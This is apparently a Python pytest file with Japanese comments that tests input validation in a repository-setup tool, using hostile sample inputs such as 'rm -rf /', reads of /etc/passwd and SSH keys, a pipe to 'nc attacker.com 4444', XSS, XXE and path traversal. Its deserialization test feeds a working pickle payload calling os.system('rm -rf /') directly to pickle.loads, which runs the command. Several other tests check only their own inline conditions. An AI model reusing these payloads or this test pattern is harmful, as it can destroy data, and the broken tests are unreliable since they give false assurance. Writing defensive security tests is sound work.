"""
入力検証セキュリティテスト

マルチプラットフォームテスト方針に準拠した入力検証セキュリティのテスト
"""

import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from setup_repo.config import Config, ConfigError
from setup_repo.github_api import GitHubAPI, GitHubAPIError
from setup_repo.git_operations import GitOperations, GitError
from tests.multiplatform.helpers import verify_current_platform


class TestInputValidationSecurity:
    """入力検証セキュリティのテスト"""

    def test_config_injection_prevention(self):
        """設定インジェクション攻撃の防止テスト"""
        platform_info = verify_current_platform()
        
        malicious_inputs = [
            '{"github": {"token": "$(rm -rf /)"}}',
            '{"github": {"token": "`cat /etc/passwd`"}}',
            '{"github": {"token": "${HOME}/.ssh/id_rsa"}}',
            '{"github": {"token": "../../etc/passwd"}}',
            '{"github": {"token": "file:///etc/passwd"}}',
        ]
        
        config = Config()
        
        for malicious_input in malicious_inputs:
            with pytest.raises((ConfigError, ValueError)):
                config.load_from_string(malicious_input)

    def test_path_traversal_prevention(self):
        """パストラバーサル攻撃の防止テスト"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\sensitive",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            
            for malicious_path in malicious_paths:
                with pytest.raises((ValueError, OSError, PermissionError)):
                    # パストラバーサルを試行
                    dangerous_path = base_path / malicious_path
                    dangerous_path.resolve().relative_to(base_path.resolve())

    def test_command_injection_prevention(self):
        """コマンドインジェクション攻撃の防止テスト"""
        malicious_commands = [
            "repo; rm -rf /",
            "repo && cat /etc/passwd",
            "repo | nc attacker.com 4444",
            "repo`whoami`",
            "repo$(id)",
            "repo; powershell -c 'Get-Content C:\\Windows\\System32\\config\\SAM'",
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            git_ops = GitOperations(temp_dir)
            
            for malicious_cmd in malicious_commands:
                with pytest.raises((GitError, ValueError)):
                    # 実際のコマンド実行はモックで防ぐ
                    with patch("subprocess.run") as mock_run:
                        mock_run.side_effect = ValueError("Invalid command")
                        git_ops.clone(malicious_cmd)

    def test_github_token_validation(self):
        """GitHubトークンの検証テスト"""
        invalid_tokens = [
            "",  # 空文字
            "short",  # 短すぎる
            "ghp_" + "a" * 100,  # 長すぎる
            "invalid_prefix_token",  # 無効なプレフィックス
            "ghp_invalid!@#$%^&*()",  # 無効な文字
            "../../../etc/passwd",  # パストラバーサル
            "$(whoami)",  # コマンドインジェクション
        ]
        
        for invalid_token in invalid_tokens:
            with pytest.raises((GitHubAPIError, ValueError)):
                api = GitHubAPI(invalid_token)
                api.validate_token()

    def test_repository_name_validation(self):
        """リポジトリ名の検証テスト"""
        invalid_names = [
            "",  # 空文字
            "a" * 101,  # 長すぎる
            "repo with spaces",  # スペース
            "repo/with/slashes",  # スラッシュ
            "repo\\with\\backslashes",  # バックスラッシュ
            "repo.git",  # 予約語
            ".repo",  # ドットで開始
            "repo.",  # ドットで終了
            "repo--name",  # 連続ハイフン
            "repo_$(whoami)",  # コマンドインジェクション
        ]
        
        for invalid_name in invalid_names:
            with pytest.raises((GitHubAPIError, ValueError)):
                api = GitHubAPI("valid_token")
                api.validate_repository_name(invalid_name)

    def test_url_validation(self):
        """URL検証テスト"""
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "ftp://malicious.com/payload",
            "http://localhost:22/ssh",  # 内部ポートスキャン
            "https://github.com/../../etc/passwd",  # パストラバーサル
            "git://malicious.com/repo.git",  # 非セキュアプロトコル
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            git_ops = GitOperations(temp_dir)
            
            for malicious_url in malicious_urls:
                with pytest.raises((GitError, ValueError)):
                    git_ops.validate_repository_url(malicious_url)

    def test_json_injection_prevention(self):
        """JSON インジェクション攻撃の防止テスト"""
        malicious_json_inputs = [
            '{"key": "value", "malicious": "$(rm -rf /)"}',
            '{"key": "value"}\n{"injected": "payload"}',
            '{"key": "value", "__proto__": {"polluted": true}}',  # プロトタイプ汚染
            '{"constructor": {"prototype": {"polluted": true}}}',
        ]
        
        config = Config()
        
        for malicious_json in malicious_json_inputs:
            with pytest.raises((ConfigError, ValueError, TypeError)):
                config.load_from_string(malicious_json)

    def test_environment_variable_injection(self):
        """環境変数インジェクション攻撃の防止テスト"""
        malicious_env_values = [
            "$(whoami)",
            "`cat /etc/passwd`",
            "${HOME}/.ssh/id_rsa",
            "../../etc/passwd",
            "file:///etc/passwd",
        ]
        
        config = Config()
        
        for malicious_value in malicious_env_values:
            with patch.dict("os.environ", {"GITHUB_TOKEN": malicious_value}):
                with pytest.raises((ConfigError, ValueError)):
                    config.load_from_environment()

    def test_file_upload_validation(self):
        """ファイルアップロード検証テスト"""
        dangerous_file_contents = [
            b"#!/bin/bash\nrm -rf /",  # 危険なスクリプト
            b"<script>alert('xss')</script>",  # XSS
            b"\x00\x01\x02\x03",  # バイナリデータ
            b"A" * (10 * 1024 * 1024),  # 大きすぎるファイル
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            for i, content in enumerate(dangerous_file_contents):
                test_file = Path(temp_dir) / f"dangerous_{i}.txt"
                
                with pytest.raises((ValueError, OSError)):
                    # ファイル検証ロジック
                    if len(content) > 1024 * 1024:  # 1MB制限
                        raise ValueError("ファイルが大きすぎます")
                    
                    if b"\x00" in content:  # バイナリファイル検出
                        raise ValueError("バイナリファイルは許可されていません")
                    
                    if content.startswith(b"#!/"):  # 実行可能スクリプト検出
                        raise ValueError("実行可能ファイルは許可されていません")

    def test_regex_dos_prevention(self):
        """正規表現DoS攻撃の防止テスト"""
        # 悪意のある正規表現パターン（ReDoS攻撃）
        malicious_patterns = [
            "a" * 10000 + "!",  # 長い文字列
            "(" + "a" * 100 + ")*" + "b",  # 指数的バックトラッキング
        ]
        
        import re
        import time
        
        for pattern in malicious_patterns:
            start_time = time.time()
            
            try:
                # タイムアウト付きで正規表現を実行
                result = re.match(r"^[a-zA-Z0-9_-]+$", pattern)
                elapsed = time.time() - start_time
                
                # 処理時間が長すぎる場合は攻撃と判定
                assert elapsed < 1.0, f"正規表現処理が遅すぎます: {elapsed}秒"
                
            except re.error:
                # 無効な正規表現は適切に処理される
                pass

    def test_xml_external_entity_prevention(self):
        """XML外部エンティティ攻撃の防止テスト"""
        malicious_xml = '''<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>'''
        
        # XMLパーサーが外部エンティティを無効化していることを確認
        try:
            import xml.etree.ElementTree as ET
            
            with pytest.raises((ET.ParseError, ValueError)):
                # セキュアでないXMLパーサーの使用を防ぐ
                root = ET.fromstring(malicious_xml)
                
        except ImportError:
            pytest.skip("XML処理が利用できません")

    def test_deserialization_attack_prevention(self):
        """デシリアライゼーション攻撃の防止テスト"""
        # Pickleを使った悪意のあるペイロード
        malicious_pickle_data = b"cos\nsystem\n(S'rm -rf /'\ntR."
        
        import pickle
        
        with pytest.raises((pickle.UnpicklingError, ValueError)):
            # 信頼できないデータのデシリアライゼーションを防ぐ
            pickle.loads(malicious_pickle_data)

    @pytest.mark.integration
    def test_comprehensive_input_validation(self):
        """包括的な入力検証テスト"""
        platform_info = verify_current_platform()
        
        # 様々な攻撃ベクターを組み合わせたテスト
        attack_vectors = {
            "config": '{"github": {"token": "$(whoami)"}}',
            "path": "../../../etc/passwd",
            "command": "repo; rm -rf /",
            "url": "javascript:alert('xss')",
            "token": "invalid_token_$(id)",
        }
        
        for attack_type, malicious_input in attack_vectors.items():
            with pytest.raises((ValueError, ConfigError, GitError, GitHubAPIError)):
                if attack_type == "config":
                    config = Config()
                    config.load_from_string(malicious_input)
                elif attack_type == "path":
                    Path(malicious_input).resolve()
                elif attack_type == "command":
                    with patch("subprocess.run") as mock_run:
                        mock_run.side_effect = ValueError("Invalid command")
                        git_ops = GitOperations("/tmp")
                        git_ops.clone(malicious_input)
                elif attack_type == "url":
                    git_ops = GitOperations("/tmp")
                    git_ops.validate_repository_url(malicious_input)
                elif attack_type == "token":
                    api = GitHubAPI(malicious_input)
                    api.validate_token()

    def test_rate_limiting_protection(self):
        """レート制限保護のテスト"""
        # API呼び出しの頻度制限をテスト
        api = GitHubAPI("test_token")
        
        # 短時間での大量リクエストを試行
        with patch("requests.get") as mock_get:
            mock_get.return_value = Mock(
                status_code=403,
                json=lambda: {"message": "API rate limit exceeded"}
            )
            
            with pytest.raises(GitHubAPIError, match="レート制限"):
                for _ in range(100):  # 大量リクエスト
                    api.get_user_info()

    def test_memory_exhaustion_prevention(self):
        """メモリ枯渇攻撃の防止テスト"""
        # 大きなデータの処理制限をテスト
        large_data = "A" * (100 * 1024 * 1024)  # 100MB
        
        config = Config()
        
        with pytest.raises((MemoryError, ValueError)):
            # メモリ制限を超えるデータの処理を防ぐ
            if len(large_data) > 10 * 1024 * 1024:  # 10MB制限
                raise ValueError("データが大きすぎます")
            
            config.load_from_string(large_data)